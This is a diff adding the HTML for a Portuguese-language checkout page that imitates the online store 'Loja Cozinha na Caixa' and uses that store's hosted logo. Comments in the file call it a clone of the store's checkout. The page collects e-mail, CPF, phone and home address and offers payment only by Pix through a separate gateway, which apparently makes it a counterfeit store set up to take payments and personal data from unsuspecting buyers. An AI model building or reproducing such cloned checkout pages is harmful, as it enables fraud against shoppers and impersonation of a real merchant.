@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Dados pessoais - Loja Cozinha na Caixa | Panelas de Pedra Sabão</title>
+  <link rel="icon" href="https://acdn-us.mitiendanube.com/stores/003/396/869/themes/common/logo-1650704878-1735474193-364b902611e26bd3f4313869e0932d561735474193.ico?0" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Instrument+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/checkout.css" />
+</head>
+<body class="checkout-page">
+  <header class="cko-header">
+    <a href="index.html" class="cko-logo" title="Loja Cozinha na Caixa">
+      <img
+        src="https://d1a9qnv764bsoo.cloudfront.net/stores/003/396/869/themes/common/logo-1989275113954782747-1783332256-3cacd3a95b970b7bfe093e36247da3831783332256.png?0"
+        alt="Loja Cozinha na Caixa | Panelas de Pedra Sabão"
+      />
+    </a>
+  </header>
+
+  <button type="button" class="cko-mobile-summary-toggle" id="summaryToggle" aria-expanded="false">
+    <span>Ver detalhes do pedido</span>
+    <strong id="mobileTotal">R$0,00</strong>
+  </button>
+
+  <div class="cko-layout">
+    <main class="cko-main">
+      <ol class="cko-steps" id="steps">
+        <li class="done" data-step="cart"><a href="index.html">Carrinho</a></li>
+        <li class="active" data-step="delivery">Entrega</li>
+        <li data-step="payment">Pagamento</li>
+      </ol>
+
+      <!-- STEP: ENTREGA -->
+      <section class="cko-step" id="stepDelivery">
+        <div class="cko-coupon">
+          <button type="button" class="link-btn" id="couponToggle">Adicionar cupom de desconto</button>
+          <div class="coupon-row hidden" id="couponRow">
+            <input type="text" id="couponInput" placeholder="Cupom de desconto" autocomplete="off" />
+            <button type="button" class="btn-secondary" id="couponApply">Aplicar</button>
+          </div>
+          <p class="coupon-msg hidden" id="couponMsg"></p>
+        </div>
+
+        <h2>Dados de contato</h2>
+        <label class="field">
+          <span>E-mail</span>
+          <input type="email" id="email" placeholder="seu@email.com" required autocomplete="email" value="dsadas@gmail.com" />
+        </label>
+        <label class="check">
+          <input type="checkbox" id="marketing" checked />
+          <span>Receber ofertas e novidades por e-mail</span>
+        </label>
+
+        <h2>Entrega</h2>
+        <label class="field">
+          <span>País</span>
+          <select id="country">
+            <option value="BR" selected>Brasil</option>
+            <option value="PT">Portugal</option>
+            <option value="US">Estados Unidos</option>
+            <option value="AR">Argentina</option>
+          </select>
+        </label>
+        <label class="field">
+          <span>CEP</span>
+          <input type="text" id="zipcode" inputmode="numeric" placeholder="00000-000" maxlength="9" value="67033-460" />
+        </label>
+
+        <div class="address-block hidden" id="addressBlock">
+          <div class="field-row">
+            <label class="field">
+              <span>Nome</span>
+              <input type="text" id="firstName" autocomplete="given-name" required />
+            </label>
+            <label class="field">
+              <span>Sobrenome</span>
+              <input type="text" id="lastName" autocomplete="family-name" required />
+            </label>
+          </div>
+          <div class="field-row">
+            <label class="field">
+              <span>Telefone</span>
+              <input type="tel" id="phone" placeholder="(00) 00000-0000" autocomplete="tel" required />
+            </label>
+            <label class="field">
+              <span>CPF</span>
+              <input type="text" id="cpf" placeholder="000.000.000-00" inputmode="numeric" required />
+            </label>
+          </div>
+          <label class="field">
+            <span>Endereço</span>
+            <input type="text" id="address" value="Travessa C" autocomplete="street-address" />
+          </label>
+          <div class="field-row">
+            <label class="field">
+              <span>Número</span>
+              <input type="text" id="number" value="333" />
+            </label>
+            <label class="field">
+              <span>Complemento</span>
+              <input type="text" id="complement" value="casa" />
+            </label>
+          </div>
+          <div class="field-row">
+            <label class="field">
+              <span>Bairro</span>
+              <input type="text" id="locality" value="Águas Brancas" />
+            </label>
+            <label class="field">
+              <span>Cidade</span>
+              <input type="text" id="city" value="Ananindeua" />
+            </label>
+          </div>
+          <label class="field">
+            <span>Estado</span>
+            <input type="text" id="state" value="Pará" />
+          </label>
+
+          <h3 class="shipping-title">Meios de envio</h3>
+          <div class="shipping-options" id="shippingOptions">
+            <label class="ship-option">
+              <input type="radio" name="shipping" value="19.85" data-label="Jadlog - .Package (via Melhor Envio)" checked />
+              <span class="ship-info">
+                <strong>Jadlog - .Package (via Melhor Envio)</strong>
+                <small>5 a 12 dias úteis</small>
+              </span>
+              <span class="ship-price" data-ship-price>R$19,85</span>
+            </label>
+            <label class="ship-option">
+              <input type="radio" name="shipping" value="35.50" data-label="Correios SEDEX" />
+              <span class="ship-info">
+                <strong>Correios SEDEX</strong>
+                <small>2 a 5 dias úteis · mais rápido</small>
+              </span>
+              <span class="ship-price" data-ship-price>R$35,50</span>
+            </label>
+            <p class="ship-free-note" id="shipFreeNote" hidden>Frete grátis: produtos acima de R$300,00</p>
+          </div>
+        </div>
+
+        <button type="button" class="btn-primary" id="continueDelivery">Continuar</button>
+      </section>
+
+      <!-- STEP: PAGAMENTO (clone /checkout/v3/next) — só Pix -->
+      <section class="cko-step hidden" id="stepPayment">
+        <div class="cko-coupon">
+          <button type="button" class="link-btn" id="couponTogglePay">Adicionar cupom de desconto</button>
+          <div class="coupon-row hidden" id="couponRowPay">
+            <input type="text" id="couponInputPay" placeholder="Cupom de desconto" autocomplete="off" />
+            <button type="button" class="btn-secondary" id="couponApplyPay">Aplicar</button>
+          </div>
+          <p class="coupon-msg hidden" id="couponMsgPay"></p>
+        </div>
+
+        <div class="review-card">
+          <div class="review-body">
+            <strong id="reviewEmail">dsadas@gmail.com</strong>
+          </div>
+          <button type="button" class="link-btn review-edit" data-back="delivery">Alterar</button>
+        </div>
+
+        <div class="review-card">
+          <div class="review-body">
+            <div id="reviewAddressLine">Travessa C 333, casa</div>
+            <div id="reviewCepLine">CEP 67033-460 - Águas Brancas</div>
+            <div id="reviewCityLine">Ananindeua, Pará</div>
+          </div>
+          <button type="button" class="link-btn review-edit" data-back="delivery">Alterar</button>
+        </div>
+
+        <div class="review-card">
+          <div class="review-body">
+            <span id="reviewShipping">Jadlog - .Package (via Melhor Envio) · R$284,99</span>
+          </div>
+          <button type="button" class="link-btn review-edit" data-back="delivery">Alterar</button>
+        </div>
+
+        <h2>Forma de pagamento</h2>
+
+        <div class="pay-methods pay-pix-only">
+          <label class="pay-option selected">
+            <input type="radio" name="pay" value="pix" checked />
+            <span class="pay-option-content">
+              <span class="pay-option-title">
+                <svg class="pix-icon" viewBox="0 0 16 16" aria-hidden="true"><path fill="currentColor" d="M11.9 1.3 8.8 4.4a1.9 1.9 0 0 1-2.6 0L3.1 1.3A.7.7 0 0 0 2.6 1H1.5l4.2 4.2a2.8 2.8 0 0 0 4 0L13.8 1h-1.1a.7.7 0 0 0-.5.3zM1 2.6v1.1c0 .2.1.4.3.5l3.1 3.1a1.9 1.9 0 0 1 0 2.6L1.3 12.9a.7.7 0 0 0-.3.5v1.1l4.2-4.2a2.8 2.8 0 0 0 0-4L1 2.6zm14 0-4.2 4.2a2.8 2.8 0 0 0 0 4l4.2 4.2v-1.1a.7.7 0 0 0-.3-.5l-3.1-3.1a1.9 1.9 0 0 1 0-2.6l3.1-3.1a.7.7 0 0 0 .3-.5V2.6zM4.1 14.7l3.1-3.1a1.9 1.9 0 0 1 2.6 0l3.1 3.1c.1.1.3.2.5.2h1.1l-4.2-4.2a2.8 2.8 0 0 0-4 0L2.2 15h1.1c.2 0 .4-.1.5-.3z"/></svg>
+                Pix
+              </span>
+              <em>5% OFF</em>
+            </span>
+          </label>
+        </div>
+
+        <div class="pay-panel pix-panel">
+          <p class="hint">
+            Ao clicar em <strong>Fazer pedido</strong>, um QR Code Pix será gerado.
+            O pagamento é confirmado na hora e você já garante o desconto de 5%.
+          </p>
+          <ul class="pix-benefits">
+            <li>Aprovação imediata</li>
+            <li>Desconto automático de 5% no total dos produtos</li>
+            <li>Sem taxas extras</li>
+          </ul>
+        </div>
+
+        <button type="button" class="btn-primary" id="finishOrder">Fazer pedido</button>
+      </section>
+
+      <!-- STEP: PIX real (BravoPay) -->
+      <section class="cko-step hidden" id="stepPix">
+        <div class="success-box pix-wait">
+          <h2>Pague com Pix</h2>
+          <p>Escaneie o QR Code ou copie o código. Assim que o pagamento for confirmado, você será redirecionado.</p>
+          <div id="qrcode" class="pix-qr-real"></div>
+          <p class="pix-copy">Pix Copia e Cola</p>
+          <code class="pix-code" id="pixCode"></code>
+          <button type="button" class="btn-secondary" id="copyPixBtn">Copiar código Pix</button>
+          <p class="order-code">Pedido: <strong id="orderCode"></strong></p>
+          <p class="pix-paid-note">Total: <strong id="paidTotal"></strong></p>
+          <p class="pix-status" id="pixStatus">Aguardando pagamento...</p>
+        </div>
+      </section>
+    </main>
+
+    <aside class="cko-summary" id="summaryPanel">
+      <div class="summary-inner">
+        <h2 class="summary-title">Resumo do pedido</h2>
+        <ul class="summary-items" id="summaryItems"></ul>
+
+        <div class="cko-coupon desktop-only">
+          <button type="button" class="link-btn" id="couponToggleSide">Adicionar cupom de desconto</button>
+        </div>
+
+        <div class="summary-totals">
+          <div><span>Subtotal</span><span id="sumSubtotal">R$0,00</span></div>
+          <div id="discountRow" class="hidden"><span>Desconto</span><span id="sumDiscount">- R$0,00</span></div>
+          <div id="pixDiscountRow"><span>Desconto da forma de pagamento</span><span id="sumPixDiscount">- R$0,00</span></div>
+          <div><span>Custo de frete</span><span id="sumShipping">R$0,00</span></div>
+          <div class="total"><span>Total</span><span id="sumTotal">R$0,00</span></div>
+        </div>
+      </div>
+    </aside>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <script src="js/utm.js"></script>
+  <script src="js/auth.js"></script>
+  <script src="js/checkout.js"></script>
+</body>
+</html>
